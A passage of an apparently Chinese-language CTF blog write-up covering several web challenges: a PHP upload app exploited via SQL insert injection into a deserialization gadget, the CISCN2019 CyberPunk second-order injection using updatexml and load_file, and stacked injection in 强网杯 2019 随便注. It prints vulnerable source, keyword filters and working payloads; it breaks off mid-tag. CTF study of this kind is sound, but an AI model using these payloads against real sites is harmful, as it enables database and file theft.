class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//helper.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">$show-&gt;Delete_All_Images();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $con;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$file = <span class="keyword">new</span> upload();</span><br><span class="line">$file-&gt;upload_base();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在一处注入点</p><p><img src="/2019/12/30/积累的一些web题目/16.png" alt=""></p><p><code>helper.php</code>上部分未对<code>title</code>进行过滤，可以在图中红线部分进行<code>insert</code>注入，抽象出来的语句</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into images (`title`,`filename`,`ext`,`path`,`attr`) values (<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>)</span><br></pre></td></tr></table></figure><p><code>a</code>是我们可控的，同时在<code>show.php</code>中发现了反序列化的触发点</p><p><img src="/2019/12/30/积累的一些web题目/17.png" alt="17"></p><p>该处是针对语句中的<code>e</code>进行反序列化操作，通过注入我们可以控制<code>e</code>处序列化的字符串，利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>然后将<code>%00*%00</code>替换为<code>\\0\\0\\0</code>，因为代码中存在该处替换</p><p><img src="/2019/12/30/积累的一些web题目/18.png" alt="18"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"helper"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"\\0\\0\\0config"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"/flag"</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"\\0\\0\\0ifview"</span>;<span class="attribute">i</span>:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>因为文件名中不可以有<code>：&quot;</code>等字符，把该段转化成16进制，最后文件名为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a','b','c','d',0x4f3a363a<span class="number">226865</span>6c<span class="number">70657222</span>3a323a7b733a393a225c305c305c<span class="number">3063</span>6f6e<span class="number">66696722</span>3b733a353a222f666c<span class="number">616722</span>3b733a393a225c305c305c<span class="number">30696676696577</span>223b693a313b7d)#</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/19.png" alt="19"></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/1.png" alt=""></p><p>用伪协议读一下源码</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>重点代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//confirm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">"已提交订单"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"订单提交成功"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"信息不全"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"订单修改成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"未找到订单!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"信息不全"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中输入的时候<code>confirm.php</code>未对<code>address</code>进行过滤，只是进行了<code>addslashes</code>处理，这样配合修改功能，就可以造成二次注入，可使用报错函数<code>updatexml</code>，<code>payload</code>如下</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' where user_id=updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select substr(load_file('/flag.txt'),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>当更新地址时，该句会出现错误带出数据</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row['address'].<span class="string">"' where `user_id`="</span>.$row['user_id']</span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/5.png" alt=""></p><p>该题目考察堆叠注入相关知识，其中有如下过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br><span class="line">strstr($inject, <span class="string">"set"</span>) &amp;&amp; strstr($inject, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure><p>进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/6.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">use</span> supersqli;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/7.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/8.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/9.png" 